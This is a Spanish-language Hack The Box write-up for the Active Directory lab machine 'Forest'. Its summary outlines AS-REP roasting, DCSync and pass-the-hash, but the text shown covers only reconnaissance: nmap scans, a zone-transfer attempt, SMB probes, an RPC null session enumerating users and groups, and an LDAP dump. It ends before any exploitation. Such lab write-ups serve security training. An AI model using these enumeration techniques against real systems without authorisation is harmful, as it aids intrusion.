---
title: "Forest - Hack The Box"
date: 2024-10-10
draft: false
slug: "htb-writeup-forest"
excerpt: "Esta máquina sí fue algo sencilla. Todo se basó en la enumeración, empezamos enumerando el DNS para ver qué información obteníamos e intentamos aplicar el ataque de transferencia de zona sin éxito. Al solo encontrar el dominio y un subdominio, procedemos a enumerar el servicio SMB, lo cual descubrimos que es necesario de credenciales válidas para hacerlo. Pasamos a enumerar el servicio RPC, obteniendo una sesión nula que nos permitió enumerar usuarios y grupos. Utilizando esos usuarios obtenidos, aplicamos el AS-REP Roasting attack, con el que obtuvimos el hash del TGT de un usuario y desciframos su contraseña usando JohnTheRipper para obtenerla en texto claro. Gracias a esto, nos conectamos vía WinRM a la máquina víctima usando Evil-WinRM y procedemos a cargar PowerView.ps1 y SharpHound para poder enumerar la máquina usando BloodHound. Dentro de BloodHound, identificamos que nuestro usuario, tiene relación con el grupo Account Operators y tiene el privilegio GenericAll sobre el grupo Exchange Windows Permissions, que, siguiendo las instrucciones de BloodHound, nos permite realizar el DNSync Attack para poder dumpear los hashes NTLM de todos los usuarios, entre ellos el hash del administrador. Una vez obtenido el hash del administrador, aplicamos Pass-The-Hash usando PsExec de impacket y Evil-WinRM para ganar acceso a la máquina como administrador."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Active Directory", "DNS", "SMB", "RPC", "LDAP", "DNS Enumeration", "RPC Enumeration", "LDAP Enumeration", "AS-REP Roasting Attack", "SharpHound and BloodHound Enumeration", "Abusing Account Operators Group", "DCSync Attack", "Privesc - DCSync Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "dig"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "rpcclient"
  - "ldapsearch"
  - "impacket-GetNPUSers"
  - "JohnTheRipper"
  - "evil-winrm"
  - "net user"
  - "net groups"
  - "python3"
  - "BloodHound 4.3.1"
  - "ldapdomaindump"
  - "SharpHound 1.1.1"
  - "PowerView.ps1"
  - "impacket-secretsdump"
  - "impacket-psexec"
links:
  - "https://linube.com/ayuda/articulo/287/como-utilizar-el-comando-dig"
  - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators"
  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync"
  - "https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.5.7"
  - "https://github.com/dirkjanm/ldapdomaindump"
  - "https://sniferl4bs.com/2020/02/obteniendo-informaci%C3%B3n-del-dominio-con-ldapdomaindump/"
  - "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-forest/Forest.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=93.3 ms
64 bytes from 10.10.10.161: icmp_seq=2 ttl=127 time=69.4 ms
64 bytes from 10.10.10.161: icmp_seq=3 ttl=127 time=67.7 ms
64 bytes from 10.10.10.161: icmp_seq=4 ttl=127 time=67.2 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 12:25 CST
Initiating SYN Stealth Scan at 12:25
Scanning 10.10.10.161 [65535 ports]
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 49667/tcp on 10.10.10.161
Discovered open port 49671/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 49975/tcp on 10.10.10.161
Discovered open port 49706/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Increasing send delay for 10.10.10.161 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 88/tcp on 10.10.10.161
Increasing send delay for 10.10.10.161 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 49676/tcp on 10.10.10.161
Increasing send delay for 10.10.10.161 from 10 to 20 due to max_successful_tryno increase to 6
Discovered open port 49664/tcp on 10.10.10.161
Increasing send delay for 10.10.10.161 from 20 to 40 due to max_successful_tryno increase to 7
Discovered open port 9389/tcp on 10.10.10.161
Increasing send delay for 10.10.10.161 from 40 to 80 due to max_successful_tryno increase to 8
Discovered open port 49666/tcp on 10.10.10.161
Increasing send delay for 10.10.10.161 from 80 to 160 due to max_successful_tryno increase to 9
Discovered open port 49665/tcp on 10.10.10.161
Discovered open port 49684/tcp on 10.10.10.161
Discovered open port 3268/tcp on 10.10.10.161
Discovered open port 49677/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
Discovered open port 47001/tcp on 10.10.10.161
Discovered open port 3269/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Completed SYN Stealth Scan at 12:26, 54.16s elapsed (65535 total ports)
Nmap scan report for 10.10.10.161
Host is up, received user-set (0.12s latency).
Scanned at 2024-10-10 12:25:28 CST for 54s
Not shown: 64365 closed tcp ports (reset), 1146 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49975/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.30 seconds
           Raw packets sent: 261692 (11.514MB) | Rcvd: 78892 (3.156MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos muchos puertos abiertos, y muchos conocidos que indican que nos enfrentamos a un **Directorio Activo (AD)**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49975 10.10.10.161 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 12:28 CST
Nmap scan report for 10.10.10.161
Host is up (0.071s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-10 18:35:40Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49975/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-10-10T11:36:32-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m52s, deviation: 4h02m30s, median: 6m51s
| smb2-time: 
|   date: 2024-10-10T18:36:30
|_  start_date: 2024-10-09T16:01:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.17 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Con esto ya comprobamos que estamos ante un **AD**. Obtuvimos información útil, por ejemplo, tenemos el **dominio del AD** que sería **htb.local**, vemos activos el **servicio DNS, RPC, LDAP, SMB, kerberos y WMI**, ya con esto nos damos una idea de cómo empezar. 

Empezaremos por enumerar el **servicio DNS**.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de DNS y Aplicando Ataque de Transferencia de Zona (AXFR) (Fallo) {#DNS}

Antes que nada, registra el dominio en el **/etc/hosts** si aún no lo ha hecho:
```bash
nano /etc/hosts
10.10.10.161 htb.local
```

Veamos si podemos obtener algo de información del **DNS**, lo podemos hacer usando la herramienta **dig**:
```bash
dig @10.10.10.161 htb.local

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61530
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 28a522c34514f654 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      A

;; ANSWER SECTION:
htb.local.              600     IN      A       10.10.10.161

;; Query time: 72 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Thu Oct 10 12:47:02 CST 2024
;; MSG SIZE  rcvd: 66
```
Nos está respondiendo, pero no vemos algo importante.

Probemos si hay algún correo registrado:
```bash
dig @10.10.10.161 htb.local mx

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.161 htb.local mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49741
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: d48d4f37d1886254 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      MX

;; AUTHORITY SECTION:
htb.local.              3600    IN      SOA     forest.htb.local. hostmaster.htb.local. 108 900 600 86400 3600

;; Query time: 76 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Thu Oct 10 12:47:08 CST 2024
;; MSG SIZE  rcvd: 104
```
Nada, pero parece que hay 2 subdominios, regístralos en el **/etc/hosts**, por si las dudas.

Probemos si hay algún otro servidor registrado:
```bash
dig @10.10.10.161 htb.local ns

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.161 htb.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26581
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: ce3ed7550289491d (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      NS

;; ANSWER SECTION:
htb.local.              3600    IN      NS      forest.htb.local.

;; ADDITIONAL SECTION:
forest.htb.local.       3600    IN      A       10.10.10.161

;; Query time: 72 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Thu Oct 10 12:47:42 CST 2024
;; MSG SIZE  rcvd: 87
```
Parece que no, aparte del subdominio que ya encontramos, no hay nada más.

Por último, intentemos aplicar un ataque de transferencia de zona para ver si obtenemos la información sobre subdominios:
```bash
dig @10.10.10.161 htb.local axfr

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.161 htb.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
No obtuvimos nada.

Continuemos con otro servicio.

### Enumeración de Servicio SMB {#SMB}

Veamos qué nos dice **crackmapexec**:
```bash
crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```
Nos muestra la versión del SO y que tiene una arquitectura de 64 bits. Además, menciona que este servicio está firmado y es todo.

Veamos si podemos listar los recursos compartidos con **smbclient**:
```bash
smbclient -L //10.10.10.161// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Nada.

Probemos con **smbmap** por si las dudas:
```bash
smbmap -H 10.10.10.161

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections
```
Tampoco, lo que me indica que necesitaremos de un usuario y contraseña válidos para poder enumerar este servicio.

### Enumeración de Servicio RPC {#RPC}

Como en otras máquinas, probemos si podemos entrar a este servicio con una sesión nula:
```bash
rpcclient -U "" 10.10.10.161 -N
rpcclient $>
```
Sí podemos.

Comencemos enumerando los usuarios de este servicio:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
Muy bien, son bastantes usuarios.

Veamos qué grupos podemos obtener:
```batch
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
Son un montón de grupos también, y se pueden ver uno que otro que pueden ser de interés como el **Service Accounts y el Privileged IT Accounts**.

Probemos si hay más usuarios administradores:
```batch
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 09 Oct 2024 10:02:01 CST
        Logoff Time              :      Wed, 31 Dec 1969 18:00:00 CST
        Kickoff Time             :      Wed, 31 Dec 1969 18:00:00 CST
        Password last set Time   :      Mon, 30 Aug 2021 19:51:59 CDT
        Password can change Time :      Tue, 31 Aug 2021 19:51:59 CDT
        Password must change Time:      Wed, 13 Sep 30828 20:48:05 CST
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000007f
        padding1[0..7]...
        logon_hrs[0..21]...
```
Parece que no, solamente hay un administrador.

Por último, veamos si podemos obtener información de los usuarios registrados; puede que encontremos una contraseña en texto claro:
```batch
rpcclient $> querydispinfo
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
```
Pues no, no encontramos algo más que sea útil.

Lo importante es que obtuvimos una lista de usuarios que podemos usar para aplicar un ataque.

### Enumeración de Servicio LDAP {#LDAP}

Al intentar enumerar por el **servicio LDAP**, podemos obtener mucha información, por lo que lo ideal es ir tratando de ver qué información nos puede ser útil.

Intentemos:
```bash
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20241010202448.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
```
Esto es demasiada información.

Ocuparemos **grep** para ir purgando con tal de solo ver lo que nos puede ayudar.

Obtengamos los grupos y usuarios:
```bash
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local" | grep -i "samaccountname"
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: Key Admins
sAMAccountName: Enterprise Key Admins
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: EXCH01$
sAMAccountName: FOREST$
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: $D31000-NSEL5BRJ63V7
sAMAccountName: test
sAMAccountName: sebastien
sAMAccountName: santi
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: Pre-Windows 2000 Compatible Access
sAMAccountName: Incoming Forest Trust Builders
sAMAccountName: Windows Authorization Access Group
sAMAccountName: Terminal Server License Servers
sAMAccountName: Users
sAMAccountName: Guests
sAMAccountName: Remote Desktop Users
sAMAccountName: Network Configuration Operators
sAMAccountName: Performance Monitor Users
sAMAccountName: Performance Log Users
sAMAccountName: Distributed COM Users
sAMAccountName: IIS_IUSRS
sAMAccountName: Cryptographic Operators
sAMAccountName: Event Log Readers
sAMAccountName: Certificate Service DCOM Access
sAMAccountName: RDS Remote Access Servers
sAMAccountName: RDS Endpoint Servers
sAMAccountName: RDS Management Servers
sAMAccountName: Hyper-V Administrators
sAMAccountName: Access Control Assistance Operators
sAMAccountName: Remote Management Users
sAMAccountName: System Managed Accounts Group
sAMAccountName: Storage Replica Administrators
sAMAccountName: Organization Management
sAMAccountName: Recipient Management
sAMAccountName: View-Only Organization Management
sAMAccountName: Public Folder Management
sAMAccountName: UM Management
sAMAccountName: Help Desk
sAMAccountName: Records Management
sAMAccountName: Discovery Management
sAMAccountName: Server Management
sAMAccountName: Delegated Setup
sAMAccountName: Hygiene Management
sAMAccountName: Compliance Management
sAMAccountName: Security Reader
sAMAccountName: Security Administrator
sAMAccountName: Exchange Servers
sAMAccountName: Exchange Trusted Subsystem
sAMAccountName: Managed Availability Servers
sAMAccountName: Exchange Windows Permissions
sAMAccountName: ExchangeLegacyInterop
